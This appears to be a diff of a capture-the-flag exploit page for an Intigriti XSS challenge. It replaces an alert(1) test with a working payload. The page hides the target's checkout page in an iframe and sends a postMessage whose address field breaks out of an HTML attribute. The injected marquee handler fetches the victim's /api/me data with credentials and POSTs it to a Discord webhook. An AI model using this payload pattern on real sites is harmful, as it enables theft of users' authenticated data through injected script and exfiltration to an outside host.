@@ -1,23 +1,23 @@
-<!DOCTYPE html>
-<body>
-<script>
-// Test XSS with alert(1) first
-const xss = `<img src=x onerror=alert(1)>`;
+  <!DOCTYPE html>
+  <body>
+  <script>
+  const webhook = 'https://discord.com/api/webhooks/1463231849550581891/...';
+  const xss = `<details><summary>x</summary><marquee onstart="fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('${webhook}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d.flag})}))">x</marquee></details>`;       
 
-const f = document.createElement('iframe');
-f.style.display = 'none';
-f.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+  const f = document.createElement('iframe');
+  f.style.display = 'none';
+  f.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
 
-f.onload = () => {
-    setTimeout(() => {
-        f.contentWindow.postMessage({
-            type: 'submitTransaction',
-            transaction: { toAddress: `" onmouseover="${xss}" x="`, currency: '1337COIN', amount: 1 }
-        }, '*');
-        setTimeout(() => window.location = 'https://challenge-0126.intigriti.io/marketwatch.html', 2000);
-    }, 2000);
-};
-document.body.appendChild(f);
-</script>
-</body>
-</html>
+  f.onload = () => {
+      setTimeout(() => {
+          f.contentWindow.postMessage({
+              type: 'submitTransaction',
+              transaction: { toAddress: `" title="${xss}" x="`, currency: '1337COIN', amount: 0.00000001 }
+          }, '*');
+          setTimeout(() => window.location = 'https://challenge-0126.intigriti.io/marketwatch.html', 3000);                                                                               
+      }, 2000);
+  };
+  document.body.appendChild(f);
+  </script>
+  </body>
+  </html>
